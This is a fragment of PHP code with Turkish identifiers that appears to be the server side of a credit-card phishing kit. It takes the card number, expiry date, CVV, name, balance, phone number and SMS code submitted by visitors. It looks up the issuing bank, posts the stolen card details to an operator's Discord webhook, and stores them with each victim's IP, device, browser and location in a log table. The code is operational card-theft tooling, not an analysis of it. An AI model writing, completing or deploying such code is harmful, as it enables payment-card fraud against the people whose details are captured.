...
include_once("./txmd/Data/Server/DiscordWebhook.php");
include_once("./txmd/Data/Server/TelegramBot.php");
    ...
    if ($checkAdres["ip_adresi"]) {
        if ($_POST['kredi_karti']) {
            if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
                ...
                include_once("./txmd/Data/Server/GrabBank.php");
                if ($banka == null) {
                    $banka = "BULUNAMADI";
                } else {
                    $banka;
                ...
                if ($yasakli_bin or $yasakli_bin_kodu) {
                    if ($check["ip"]) {
                        ...
                        if ($checkAdmin["discord_webhook"] == 1 && $checkVisitor["discord_webhook_sended"] == 0) {
                            txmd_webhook($checkAdmin["discord_webhook_url"], tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])) . ' ' . tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])) . ' ' . htmlspecialchars($_POST['cvv']), $banka . ' (' . $seviye . ')', $check['tarih'], $check['device'] . ' - ' . $check['browser'], $check['ip']);
                            $sorgu1 = $pdo->prepare("INSERT INTO logs SET ip=?,tarih=?,isim_soyisim=?,kredi_karti=?,skt=?,cvv=?,bakiye=?,banka=?,marka=?,seviye=?,tel_no=?,sms=?,durum=?,device=?,browser=?,country=?,city=?,isp=?");
                            $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?");
                            $pdo->query("UPDATE logs_visitor SET discord_webhook_sended = 1 WHERE ip = '{$ip}'");
                            $sorgu1->execute(array($ip, date('d.m.Y H:i'), mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), htmlspecialchars($_POST['bakiye']), $banka, $marka, $seviye, isset($_POST['tel_no']) ? htmlspecialchars($_POST['tel_no']) : '', isset($_POST['sms']) ? htmlspecialchars($_POST['sms']) : '', 'Bekleme Ekranı', isset($check['device']) ? $check['device'] : '', isset($check['browser']) ? $check['browser'] : '', isset($check['country']) ? $check['country'] : '', isset($check['city']) ? $check['city'] : '', isset($check['isp']) ? $check['isp'] : ''));
